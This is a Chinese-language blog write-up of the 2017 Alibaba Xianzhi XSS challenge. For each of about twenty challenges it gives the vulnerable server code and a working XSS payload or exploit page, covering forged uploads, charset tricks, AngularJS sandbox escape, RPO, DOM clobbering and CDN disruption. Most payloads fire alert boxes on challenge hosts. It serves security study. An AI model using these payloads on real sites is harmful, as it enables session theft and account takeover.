---
title: 阿里先知xss挑战赛 Writeup
date: 2017-08-31 16:07:11
tags:
- xss
---


8月里阿里先知办了一个xss的挑战赛，可惜全程都刚好属于比较忙的时候，很多题目都是违背基本规则的，要花长时间来搜索尝试...和一个朋友花了一天的时间，也就做出来6、7题，后来就没有提交了...

现在整理所有的Writeup，先膜一发@L3m0n师傅，大部分不会的题目思路都是看了他的Writeup才知道的...下面整理的wp中，我做了的部分会尽量加入我的理解，其他部分基本为lemon师傅的思路.

[https://xianzhi.aliyun.com/forum/read/2044.html](https://xianzhi.aliyun.com/forum/read/2044.html)

<!--more-->

# 01 文件上传 #

```
<?php
header("X-XSS-Protection: 0");
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);
// Check if image file is a actual image or fake image
if(isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if($check !== false) {
        echo "File is an image - " . $check["mime"] . ".<BR>";
        $uploadOk = 1;
    } else {
        echo "File is not an image.";
        $uploadOk = 0;
    }
}
// Check if file already exists
if (file_exists($target_file)) {
    echo "Sorry, file already exists.";
    $uploadOk = 0;
}
// Check file size
if ($_FILES["fileToUpload"]["size"] > 500000) {
    echo "Sorry, your file is too large.";
    $uploadOk = 0;
}
// Allow certain file formats
if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
&& $imageFileType != "gif" ) {
    echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
    $uploadOk = 0;
}
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
    echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
}
?>
```

由于所有题目的要求都是非交互，所以在这个题目最基本的要求上就违背了同源策略，通过js来实现的文件上传本身就是跨源传数据，而唯一的办法只能是自动提交表单。

但是文件上传这一部分是必须人来交互的，如果直接提交一个文件的话，服务端收到的`$_FILE`变量就是一个空数组，所以我们没办法以任何方式来传文件，但幸运的是，只需要服务端读取到一部分变量就可以了（即使是这样，也只有ie才能伪造）。

[https://www.exploresecurity.com/a-tricky-case-of-xss/](https://www.exploresecurity.com/a-tricky-case-of-xss/)

逻辑上差不多就是通过设置enctype这个属性，然后伪造一个接近文件上传的请求。

exp
```
<form name="xss" method="post" action="http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss1.php" enctype="multipart/form-data">
<textarea name='fileToUpload"; filename="test.<img src=a onerror=alert(1)>.png'>
File Contents Didn't Matter Here
</textarea>
<input name="action" value="fileupload"/>
<input type="submit" name="" value="" size="0" />
</form>
<script>document.xss.submit();</script>
```

# 02 getallheaders() #

```
<?php
header('Pragma: cache');
header("Cache-Control: max-age=".(60*60*24*100)); 
header("X-XSS-Protection: 0");
?>
<html>
<head>
<meta charset=utf-8>
<head>
<body>
<?php
if(isset($_SERVER['HTTP_REFERER'])) 
{
echo "Bad Referrer!";
}
else
{
foreach (getallheaders() as $name => $value) {
    echo "$name: $value\n";
}
}
?>
</body>
</html>
```

我觉得这个题目比较难，而且利用思路也很有趣，这题是我朋友教我的@lightless，主要问题在于页面开启了缓存。
```
header('Pragma: cache');
header("Cache-Control: max-age=".(60*60*24*100)); 
```

如果请求内容不影响服务端，那么浏览器就会自动加载上一次缓存的请求。

思路就是先用ajax带着头请求一下，然后再用iframe请求。

这里还需要使用meta来禁止referer，不然会被拦截。

exp：
```
<html>
<head>
<meta name="referrer" content="never">
<script>
var request = new Request('http://xianzhi.aliyun.com/xss2.php', {
  method: 'GET',
  mode: 'no-cors',
  redirect: 'follow',
  headers: new Headers({
    'Content-Type': 'text/plain',
    'Accept': 'application/jsona<img src=1 onerror=alert(document.domain)>',
  })
});
fetch(request).then(function() {
  console.log(1);
});
</script>
</head>
<body>
<iframe src="http://xianzhi.aliyun.com/xss2.php"></iframe>
</body>
</html>
```

# 03 json #

```
<?php
header("Content-Type:application/json;charset=utf-8");
header("X-XSS-Protection: 0");
echo '{"errno":0,"error":"","data":{"user":{"id":"2","user_name":"\u4e13\u4e1a\u6295\u8d44\u4ebafh","email":"","mobile":"139****0002","intro":"'.$_GET["value"].'","address":null,"photo":"\/avatar\/000\/00\/00\/02virtual_avatar_big.jpg","user_uuid":"779ab6bd7e2df90c37f1e892","header_url":"\/avatar\/000\/00\/00\/02virtual_avatar_big.jpg","user_id":"2","is_real_name":0,"is_real_name_string":"\u672a\u5b9e\u540d\u8ba4\u8bc1","real_name":"\u5c24\u6654","is_investor":0,"is_leader_investor":1,"cetificate_id":"511********4273","focus_area":["\u91d1\u878d:\u91c7\u8d2d\u7269\u6d41:\u80fd\u6e90\u73af\u4fdd:\u6cd5\u5f8b\u6559\u80b2:"],"third_party":[{"openid":"1212","type":1,"is_band":1},{"openid":"2oiVL4wNxso9ttarGMIoVa1q-w8kU","type":1,"is_band":1}]}}}'
?>
```

这题刚开始的时候是jsonp的，理论上也是可以做的，但是可能jsonp误导了大家，后来题目被改成了json。

问题的核心就在于返回头`application/json`

这个请求头会把所有内容都按照json格式解析，没有任何办法绕过，这里是使用了一个ie11**低版本**的一个bug

[http://www.qingpingshan.com/jb/javascript/184536.html](http://www.qingpingshan.com/jb/javascript/184536.html)

```
ubuntu@VM-181-46-ubuntu:/home/wwwroot/default/xss/xss3$ cat index.php 
<meta charset="utf-8">
<iframe id="test" src="302.php">
</iframe>
<script>
test.location.reload();
</script>
ubuntu@VM-181-46-ubuntu:/home/wwwroot/default/xss/xss3$ cat 302.php 
<?php
header('location: http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss3333.php?value=<img src=x onerror=alert(1)>');

```

# 04 Referer #
```
<?php
header("X-XSS-Protection: 0");
?>
<html>
<head>
<meta charset="utf-8">
</head>
<body>
<?php echo "你来自:".$_SERVER['HTTP_REFERER'];?>
</body>
</html>
```

这题也是个大坑，伪造Referer的办法很多，但是问题就是在于，在chrome、firefox、高版本ie(大坑)中，都会对referer做url编码。

在低版本中的ie中，referer不会被处理，那么办法就很多，可以参考这篇文章。

[http://www.mottoin.com/88317.html](http://www.mottoin.com/88317.html)

这里就不提了，构造跳转也好，点击跳转也好，都没问题。

出题人M师傅说，可以使用flash发送请求，但我没试过：
```
package {
import flash.display.Sprite;
import flash.net.URLRequest;
import flash.net.navigateToURL;
public class xss_referrer extends Sprite{
  public function xss_referrer() {
   var url:URLRequest = new URLRequest("https://vulnerabledoma.in/xss_referrer");
   navigateToURL(url, "_self");
  }
}
}
```


# 05跳转 #

```
<?php
header("X-XSS-Protection: 0");
$url=str_replace(urldecode(""),"",$_GET["url"]);
$url=str_replace(urldecode("%0d"),"",$url);
$url=str_replace(urldecode("%0a"),"",$url);
header("Location: ".$url);
?>
<html>
<head>
<meta charset="utf-8">
</head>
<body>
<?php echo "<a href='".$url."'>如果跳转失败请点我</a>";?>
</body>
</html>
```

题目当时没做出来，想了一些办法都不行，主要就是要想办法阻止浏览器的跳转。

后来看到大部分人的解决办法都是通过跳一个小于80端口的地址，Firefox这里就不会跳转。

exp
```
http://xianzhi.aliyun.com/xss5.php?url=http://baidu.com:0/'><img src=1 onerror=alert(document.domain)><a>
```

# 06 强制下载 #

```
<?php
header("X-XSS-Protection: 0");
header('Content-Disposition: attachment; filename="'.$_GET["filename"].'"');

if(substr($_GET["url"],0,4) ==="http" && substr($_GET["url"],0,8)<>"http://0" && substr($_GET["url"],0,8)<>"http://1" && substr($_GET["url"],0,8)<>"http://l" && strpos($_GET["url"], '@') === false)
{
$opts = array('http' =>
    array(
        'method' => 'GET',
        'max_redirects' => '0',
        'ignore_errors' => '1'
    )
);
$context = stream_context_create($opts);
$url=str_replace("..","",$_GET["url"]);
$stream = fopen($url, 'r', false, $context);
echo stream_get_contents($stream);
}
else
{
echo "Bad URL!";
}
?>
```

这题和上一题的问题相同，主要问题就是跳转，只有组织跳转才能继续下去，这里可以使用一个小trick

```
PHP的header函数一旦遇到\0、\r、\n这三个字符，就会抛出一个错误，此时Location头便不会返回，浏览器也就不会跳转了
```

可以使用下面这个思路构造
[https://twitter.com/mramydnei/status/782324732897075200](https://twitter.com/mramydnei/status/782324732897075200)

exp
```
http://xianzhi.aliyun.com/xss6.php?url=http://ns1.rootk.pw:8080/xss/wp/6.php&filename=aaa%0a
```

# 07 text/plain#

```
<?php
header("X-XSS-Protection: 0");
header('Content-Type: text/plain; charset=utf-8');

if(substr($_GET["url"],0,4) ==="http" && substr($_GET["url"],0,8)<>"http://0" && substr($_GET["url"],0,8)<>"http://1" && substr($_GET["url"],0,8)<>"http://l" && strpos($_GET["url"], '@') === false)
{
$opts = array('http' =>
    array(
        'method' => 'GET',
        'max_redirects' => '0',
        'ignore_errors' => '1'
    )
);
$context = stream_context_create($opts);
$url=str_replace("..","",$_GET["url"]);
$stream = fopen($url, 'r', false, $context);
echo stream_get_contents($stream);
}
else
{
echo "Bad URL!";
}
?>
```

和前面的题目一样，这道题的主要问题就是返回头是text/plain，我们没办法通过正常的办法来注入标签执行。

这里使用的是一个前段时间公开的0day，当你打开.eml文件的时候，ie会执行mime嗅探，如果其中有html或者js，那么他们就会浏览器执行解析。

[https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/)

一个正常的eml大概就是下面这样
```
root@kali:/var/www/html# cat testeml_1.eml
TESTEML
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

=3Chtml=3Ethis=20is=20test=3C=2Fhtml=3E
```

exp
```
TESTEML
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

=3Ciframe=20src=3D=27http=3A=2f=2fxianzhi.aliyun.com=2fxss7.php=3Furl=3Dhttp=3A=2f=2fns1.rootk.pw=3A8080=2fxss=2fwp=2f9.txt=3Fname=3D=3CHTML=3E=3Ch1=3Eit=20works=3C=2Fh1=3E=27=3E=3C=2Fiframe=3E
```

这里的这种方式可以通过设置
```
X-Content-Type-Options: nosniff
```
来防御

# 08 标签#

```
<?php
header("X-XSS-Protection: 0");
header("Content-Type: text/html;charset=utf-8");

if(substr($_GET["url"],0,4) ==="http" && substr($_GET["url"],0,8)<>"http://0" && substr($_GET["url"],0,8)<>"http://1" && substr($_GET["url"],0,8)<>"http://l" && strpos($_GET["url"], '@') === false)
{
$rule="/<[a-zA-Z]/";
$opts = array('http' =>
    array(
        'method' => 'GET',
        'max_redirects' => '0',
        'ignore_errors' => '1'
    )
);
$context = stream_context_create($opts);
$url=str_replace("..","",$_GET["url"]);
$stream = fopen($url, 'r', false, $context);
$content=stream_get_contents($stream);
if(preg_match($rule,$content))
{
echo "XSS Detected!";
}
else
{
echo $content;
}
}
else
{
echo "Bad URL!";
}
?>
```

题目还没太想明白，payload如下

```
<% contenteditable onresize=alert(document.domain)>
```

这个payload在ie11中无法触发，但是我们可以通过设置x-ua-compatible来设置文档兼容性，这样就可以兼容ie9,ie19了。

然后lemon是这么解释这部分的**即便iframe内页面和父窗口即便不同域，iframe内页面也会继承父窗口的兼容模式，所以IE的一些老技巧、特性可以通过此方法去复活它.**
```
<meta http-equiv=x-ua-compatible content=IE=9>
<iframe id=x src="http://xianzhi.aliyun.com/xss8.php?url=http://ns1.rootk.pw:8080/xss/wp/8.txt"></iframe>
```

# 09 plaintext #

```
<?php
header("X-XSS-Protection: 0");
header("Content-Type: text/html;charset=gb3212");
?>
<plaintext><?php echo $_GET["text"];?>
```

代码部分很简单但是问题很多，关于页面编码的问题，我曾经在一篇博客提到过。

[https://lorexxar.cn/2017/05/23/rctf2017/#noxss](https://lorexxar.cn/2017/05/23/rctf2017/#noxss)

浏览器解析页面编码有几个步骤，当页面content-type没有指定编码，link没有指定编码，页面编码就会由meta标签指定。

这里题目执行了不存在的编码，所以，我们可以通过meta来设置页面编码。

后面就简单了，我们可以通过设置奇怪的字符集，然后用奇怪的字符集在页面内解析标签，我觉得utf-16可能更好构造，但是懒得测试了，这里贴上lemon使用的。

是cp1025编码
```
<  %4c
>  %6e
/  %61
(  %4d
)  %5d
=  %7e
;  %5e
'  %7d
```

payload
```
http://xianzhi.aliyun.com/xss9.php?text=<meta http-equiv="content-Type" content="text/html; charset=cp1025">%4c%89%94%87%01%a2%99%83%7e%f1%01%96%95%85%99%99%96%99%7e%81%93%85%99%a3%4d%f1%5d%0b%6e
```

# 10 MVM #

```
<html ng-app>
<head>
<meta charset=utf-8>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.5/angular.js"></script>
</head>
<body>
<input id="username" name="username" tabindex="1" ng-model="username" ng-init="username='<?php if(strlen($_GET["username"])<37){echo htmlspecialchars($_GET["username"]);}?>'" placeholder="username" maxlength="11" type="text">
</body>
</html>
```

angularjs的环境，一直都想仔细研究下，但是无奈没时间来学angularjs，但是现在很流行这样的现代前段框架，这种漏洞的特点就是，前端页面是通过解析渲染来构造的，很多js不会出现的问题都出现了。

这里是一个小环境，页面内的ng-init是一个特殊意义的标签，他代表着页面内部分变量的声明，具体也不太好解释，可以自己去试试看。

exp
```
{{[].pop.constructor('alert()')()}}

http://xianzhi.aliyun.com/xss10.php?username=%7B%7B%5B%5D.pop.constructor(%27alert(1)%27)()%7D%7D
```

# 11 HOST #

```
"use strict";
var http = require('http');

(function(){
    http.createServer(function (req, res) {
            res.writeHead( 200, { "Content-Type" : "text/html;charset=utf-8", "X-XSS-Protection" : "0" } );
            res.end( '<html><head><title>' + req.headers["host"] + '</title></head><body>It works!</body></html>' );

    }).listen(80);
    console.log( "Running server on port 80" );
})();
```

这个题非常迷。。看完wp我的第一反应就是，还有这种操作...

放两篇文章
[https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/](https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/)

[http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html](http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html)

差不多意思就是在低版本的ie中，跳转过去的链接不会被urlencode...

exp
```
302.php?u=http://ec2-52-15-146-21.us-east-2.compute.amazonaws.com%252f<%252ftitle><script>alert(document.domain)<%252fscript><!--.baidu.com
```

# 12 preview #

没看过题，然后lemon把这部分的wp跳过了....

贴上exp
```
<?php
header("Content-Type: application/octet-stream");
?>
<html><script>alert(document.domain)</script></html>
```

# 13 REQUEST_URI #

```
<?php
header("X-XSS-Protection: 0");
echo "REQUEST_URI:".$_SERVER['REQUEST_URI'];
?>
```

还是ie下的问题，在ie下，加一次跳转就不会进行编码。

exp
```
<?php
header("Location: http://xianzhi.aliyun.com/xss13.php/<svg/onload=alert(document.domain)>");
```

# 14 HIDDEN #

```
<?php
header('X-XSS-Protection:0');
header('Content-Type:text/html;charset=utf-8');
?>
<head>
<meta http-equiv="x-ua-compatible" content="IE=10">
</head>
<body>
<form action=''>
<input type='hidden' name='token' value='<?php
  echo htmlspecialchars($_GET['token']); ?>'>
<input type='submit'>
</body>
```

这题问题很多，因为hidden属性，所以很多事件都没办法触发了，很多人都是使用了accesskey属性，通过shift+alt+x触发。

但是还有办法，使用behavior.url

作者提出的exp
```
http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss14.php?token=%27style=%27behavior:url(?)%27onreadystatechange=%27alert(1)  
```

ie可触发

# 15 Frame Buster #

```
<?php
header("X-XSS-Protection: 0");
$page=strtolower($_GET["page"]);
$regex="/on([a-zA-Z])+/i";
$page=str_replace("style","_",$page);
?>
<html>
<head>
<meta charset=utf-8>
</head>
<body>
<form action='xss15.php?page=<?php
if(preg_match($regex,$page))
{
echo "XSS Detected!";
}
else
{
echo htmlspecialchars($page);
}
?>'></form>
<script>
if(top!=self){
 location=self.location
}
</script>
</body>
</html>
```

题目里通过设置top和self比较，禁止了通过iframe来引用这个页面，但是在ie8下，有一个trick叫做`DOM Clobbering`。

我只能说...还有这种操作...

[http://www.thespanner.co.uk/2013/05/16/dom-clobbering/](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/)

不说了，实在太老了
```
<meta http-equiv=x-ua-compatible content=IE=8>
<iframe src="http://xianzhi.aliyun.com/xss15.php?page=1'name=self location='javascript%3Aalert(document.domain)"></iframe>
```

# 16 PHP_SELF #

```
<html>
<head>
<meta charset=utf-8>
<meta http-equiv="X-UA-Compatible" content="IE=10">
<link href="styles.css" rel="stylesheet" type="text/css" />
</head>
<body>
<img src="xss.png" style="display: none;">
<h1>
<?php
$output=str_replace("<","<",$_SERVER['PHP_SELF']);
$output=str_replace(">",">",$output);
echo $output;
?>
</h1>
</body>
</html>
```

花了大时间研究这题，可惜完全不会...

这是一个RPO的漏洞，之前基本没什么了解，可以看看文章

[http://www.mbsd.jp/Whitepaper/rpo.pdf](http://www.mbsd.jp/Whitepaper/rpo.pdf)

首先是一个相对路径的问题。当我们请求链接是`xianzhi.aliyun.com/xss16.php/%7B%7D*%7Bbackground-color:%20red%7D*%7B%7D/`，服务端会忽略后面的部分，但是浏览器不会，他会把加载相对路径的css`xianzhi.aliyun.com/xss16.php/%7B%7D*%7Bbackground-color:%20red%7D*%7B%7D//styles.css`

那么现在我们已经可以任意加载css了，最大的问题的就是怎么通过css来加载js，这里使用了sct文件，就是那个xss.png文件。

payload
```
http://xianzhi.aliyun.com/xss16.php/{}*{behavior:url(http://xianzhi.aliyun.com/xss.png)}*{}/
```

ie可用

# 17 passive element #

```
<?php
header("Content-Type:text/html;charset=utf-8");
header("X-Content-Type-Options: nosniff");
header("X-FRAME-OPTIONS: DENY");
header("X-XSS-Protection: 0");
$content=$_GET["content"];
echo "<div data-content='".htmlspecialchars($content)."'>";
?>
```

这是一个div下的dom xss，唯一的问题就是，怎么能在这样的标签下无交互的执行js呢。

```
http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss17.php?content=data%27id=xss%20onfocus=alert(document.domain)%20autofoucs%20contenteditable%20tabindex=0%20x=1#xss
```

# 18 Graduate #
```
<?php
header("Content-Type:text/html;charset=utf-8");
header("X-Content-Type-Options: nosniff");
header("X-FRAME-OPTIONS: DENY");
header("X-XSS-Protection: 1");
?>
<html>
<head>
<meta charset=utf-8>
</head>
<body>
<textarea>
<?php
//Fix#001
$input=str_replace("<script>","",$_GET["input"]);
//Fix#002
$input=str_replace("/","\/",$input);
echo $input;
?>

</textarea>
</body>
</html>
```

输出点在textarea标签中，没办法闭合，绕的思路接近以前的一种通过xss auditor来杀页面内原本正常的标签，在ie里我们可以通过构造`<textare>`来杀掉页面内的标签，构造js。

```
http://xianzhi.aliyun.com/xss18.php?input=<textarea><img%20src=1%20on<script>error=alert(document.domain)>
```

# Party #

```
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<script>

function getCookie(cname) {
    var name = cname + "=";
    var decodedCookie = decodeURIComponent(document.cookie);
    var ca = decodedCookie.split(';');
    for(var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

function checkCookie() {
    var user=getCookie("username");
    if (user != "") {
        document.write("欢迎, " + unescape(user));
    } else {
         alert("请登陆")
    }
}

</script>
</head>
<body onload="checkCookie()">
<?php echo '<img name="avatar" src="'.str_replace('"',""",$_GET["link"]).'" width="30" height="40">';?>
</body>
</html>
```

exp
```
http://xianzhi.aliyun.com/xss19.php?link=data:image%2fsvg%2bxml,<meta%20xmlns=%27http://www.w3.org/1999/xhtml%27%20http-equiv=%27Set-Cookie%27%20content=%27username=%25%32%35%33%43script%25%32%35%33%65alert%25%32%35%32%381%25%32%35%32%39%25%32%35%33%43%25%32%35%32%66script%25%32%35%33%65%27%20/>
```

# 20 The End #

```
<?php
header("Content-Type:text/html;charset=utf-8");
header("X-Content-Type-Options: nosniff");
header("X-FRAME-OPTIONS: DENY");
header("X-XSS-Protection: 0");

$hookid=str_replace("=","",htmlspecialchars($_GET["hookid"]));
$hookid=str_replace(")","",$hookid);
$hookid=str_replace("(","",$hookid);
$hookid=str_replace("`","",$hookid);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<script>
hookid='<?php echo $hookid;?>';
</script>
<body>
</body>
</html>
```

限制太多了，很麻烦、
```
http://xianzhi.aliyun.com/xss20.php?hookid='%2b{valueOf:location, toString:[].join,0:'javascript:alert%25281%2529',length:1}%2b'

```

ie可用

# 番外 jquery#

```
<?php
header("Content-Type:text/html;charset=utf-8");
header("X-Content-Type-Options: nosniff");
header("X-FRAME-OPTIONS: DENY");
header("X-XSS-Protection: 0");
?>
<html>
<head>
<meta charset="utf-8">
<script src="https://code.jquery.com/jquery-3.2.1.js" integrity="sha256-DZAnKJ/6XZ9si04Hgrsxu/8s717jcIzLy3oi35EouyE=" crossorigin="anonymous"></script>
<script>
window.jQuery || document.write('<script src="http://xianzhi.aliyun.com/jquery.js"><\/script>');
</script>
</head>
<body>
<script>
    $(function(){
        try { $(location.hash) } catch(e) {}
    })

</script>
</body>
</html>
```

这题我比较喜欢，逻辑是，如果cdn的jq加载失败，那么就需要加载本地的jq，但是本地的jq1.6.1是有一些问题的，那么就要想办法把cdn打挂。

这里用了一个以前遇到过一次的，超大referrer，cdn就会拒绝访问。

chrome exp
```
http://xianzhi.aliyun.com/xss21.php?a=a....(9000个a)#<img src=1 onerror=alert(0)>
```
